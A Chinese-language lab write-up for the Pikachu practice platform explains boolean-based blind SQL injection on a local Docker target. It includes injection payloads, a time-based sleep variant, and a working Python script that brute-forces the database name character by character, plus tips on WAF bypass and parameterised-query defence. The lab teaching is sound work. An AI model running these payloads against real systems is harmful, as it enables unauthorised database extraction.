一、题目信息

  • 题目名称：SQL-Inject 盲注(base on boolean)
  • 题目平台：Pikachu 漏洞练习平台
  • 题目类型：Web安全 / SQL注入 / 布尔盲注 / 脚本自动化
  • 靶场链接：http://localhost:8080/vul/sqli/sqli_blind_b.php（本地 Docker 环境）
  • 涉及工具：浏览器（Chrome/Firefox）、Python 3、requests 库、终端

二、解题步骤

1. 分析题目考什么

本题的核心考点是布尔盲注（Boolean-Based Blind SQL Injection）。与之前的注入方式不同，页面既不会回显数据库中的数据，也不会抛出具体的 SQL 错误。攻击者只能通过页面状态的差异（例如“查询成功”与“查询失败”）来推断 SQL 条件是否成立。因为需要逐字符猜测 ASCII 码，手动测试效率极低，因此本题重点考察解题者能否编写 Python 脚本进行自动化爆破。

2. 怎么想（破题思路）

页面只提供了一个用户名查询框。解题思路如下：

  • 手动测试条件逻辑。输入 kobe' and 1=1 # 页面正常；输入 kobe' and 1=2 # 页面异常。确认布尔盲注漏洞存在。
  • 由于无法直接回显数据，需要构造逻辑判断语句，如 and ascii(substr(database(),1,1))=112。这表示判断数据库名的第一个字符的 ASCII 码是否为 112（对应字母 p）。
  • 如果页面正常，说明条件为真，该字符就是 112。依次增加字符位置，并遍历 ASCII 码范围（32-126），即可逐字符还原数据库名。
  • 由于请求次数极多，编写 Python 脚本，利用 requests 库自动发送请求并解析响应，实现自动化爆破。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：手动测试效率极低，无法完成

踩坑情况：尝试在浏览器输入框中逐字符猜测 ASCII 码，每次只能测试一个条件。猜完一个字符需要发送几十次请求，数据库名有 7 个字符，需要数百次操作，耗时巨大且极易出错。

原因分析：盲注的本质是“二十个问题”游戏，必须依靠自动化工具或脚本批量处理请求。

改进方式：编写 Python 脚本，利用二分查找法或遍历法，自动发送 HTTP 请求并比对页面特征字符串。

踩坑记录二：Payload 格式错误导致条件失效

踩坑情况：编写脚本时，Payload 末尾忘记加 # 注释符，或者单引号未闭合，导致服务器返回 SQL 语法错误，脚本运行中断。

原因分析：后端 SQL 语句形如 select * from users where username = '$input'。必须用 kobe' 闭合原引号，并用 # 注释掉末尾多余的引号。

改进方式：严格检查 Payload 结构：kobe' and ascii(substr(database(), {位置}, 1))={猜测值} #。

终极解法：Python 脚本自动化爆破

在桌面创建 blind_sqli.py，编写并执行以下代码：

import requests

url = "http://localhost:8080/vul/sqli/sqli_blind_b.php"
result = ""

for i in range(1, 21):
    for j in range(32, 127):
        payload = f"kobe' and ascii(substr(database(),{i},1))={j} #"
        params = {"name": payload, "submit": "查询"}
        res = requests.get(url, params=params)
        
        if "your uid" in res.text:
            result += chr(j)
            print(f"当前猜解结果: {result}")
            break

print(f"最终结果: {result}")

代码逐个符号深度解析：

  • import requests：导入 Python 的 HTTP 请求库，用于发送 GET 请求。
  • url = "..."：目标漏洞的 URL 地址。
  • for i in range(1, 21)：外层循环，假设数据库名长度不超过 20 个字符，从第 1 个字符开始猜。
  • for j in range(32, 127)：内层循环，遍历可打印 ASCII 码范围（32 到 126），用于逐字符猜测。
  • payload = f"kobe' and ascii(substr(database(),{i},1))={j} #"：核心 Payload。其中 substr(database(), {i}, 1) 表示截取数据库名的第 i 个字符；ascii() 将其转换为 ASCII 码；={j} 是布尔条件的判断。
  • params = {"name": payload, "submit": "查询"}：将 Payload 作为 GET 参数发送。
  • res = requests.get(url, params=params)：发送请求并获取响应。
  • if "your uid" in res.text：检查响应文本中是否包含“your uid”。如果包含，说明 SQL 条件成立（True），该字符的 ASCII 码就是 j。
  • result += chr(j)：将 ASCII 码转换为字符并拼接到结果中。
  • break：找到当前字符后，跳出内层循环，继续猜测下一个字符。

执行脚本后，终端成功打印出数据库名为 pikachu，证明盲注攻击成功。

4. 怎么迁移（跨领域联想）

  • 时间盲注（Time-Based Blind）：如果页面没有任何“成功”与“失败”的视觉差异，则无法使用布尔盲注。此时可以使用时间盲注，如 and if(ascii(substr(database(),1,1))=112, sleep(5), 0)。如果页面延迟 5 秒返回，则说明条件成立。
  • 自动化扫描与 PoC 开发：编写 Python 脚本进行自动化测试是安全工程师的核心技能。同样的思路可以应用于批量扫描 URL 是否存在 SQL 注入漏洞。
  • 代码审计与安全开发：防止盲注的根本手段是使用参数化查询（预编译语句）。将用户输入与 SQL 代码分离，才能彻底杜绝此类漏洞。

三、名词大全与原理深度复盘

1. 盲注（Blind SQL Injection）

指在 SQL 注入过程中，服务器既不返回具体的数据库错误信息，也不回显查询结果。攻击者只能通过服务器返回的“是/否”（布尔盲注）或“快/慢”（时间盲注）来推断数据内容。盲注是一种利用难度较高，但破坏力同样巨大的注入方式。

2. 布尔盲注的核心逻辑

通过构造 SQL 逻辑表达式（如 and 1=1 与 and 1=2），观察页面差异。将逻辑表达式与数据库内置函数（如 ascii()、substr()、length()）结合，即可将数据库中的数据转化为一系列“是/否”的问题，最终还原完整数据。

3. 二分查找优化

在上面的脚本中，我们使用 range(32, 127) 线性遍历 ASCII 码，最坏情况下猜一个字符需要 95 次请求。实战中通常使用二分查找（Binary Search），先问 >= 80，再问 >= 100，最多只需 7 次请求就能猜出一个字符，效率可提升十倍以上。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与联合查询注入相比：联合查询利用 union select 将数据直接输出到页面，适用于有回显的注入点；盲注适用于无回显、无报错的注入点，必须依靠逻辑判断推断数据。
  • 与报错注入相比：报错注入依赖于数据库的报错机制将数据带出；布尔盲注依赖于页面的正常/异常状态差异，适用范围更广，只要有逻辑差异即可利用。

2. 这种题目的出现原因（为什么存在）

这类漏洞的出现，是因为开发者在处理查询时，虽然未将数据直接输出到前端（避免了显错注入），但底层 SQL 语句依然存在拼接漏洞。只要 SQL 语句的查询结果能够影响页面渲染的逻辑（如“用户存在”与“用户不存在”），就会引发布尔盲注漏洞。

3. 这种应用在实际中如何体现？

在真实的渗透测试中，盲注是最常见的高危漏洞之一。安全工程师通常使用 SQLMap 等工具进行自动化爆破。如果遇到 WAF 拦截，则需要手动编写 Python 脚本，自定义请求头、代理和延迟，绕过防护设备提取数据。

4. 如何抽象理解概念（大白话理解）

如果把数据库比作一个猜谜游戏的主持人：

  • 普通注入：你问“数据库叫什么名字？”，主持人直接把答案写在黑板上（回显）。
  • 报错注入：你问“数据库叫什么名字？”，主持人不说，但一生气就大喊大叫，报错信息里带出了答案（报错回显）。
  • 布尔盲注：你问“数据库名的第一个字母是 p 吗？”，主持人只回答“对”或“不对”（页面 True/False 状态）。你只能一遍遍地问，用排除法拼出答案。手动问几千次不现实，所以必须写程序（Python 脚本）帮你疯狂提问，这就是自动化盲注的本质。
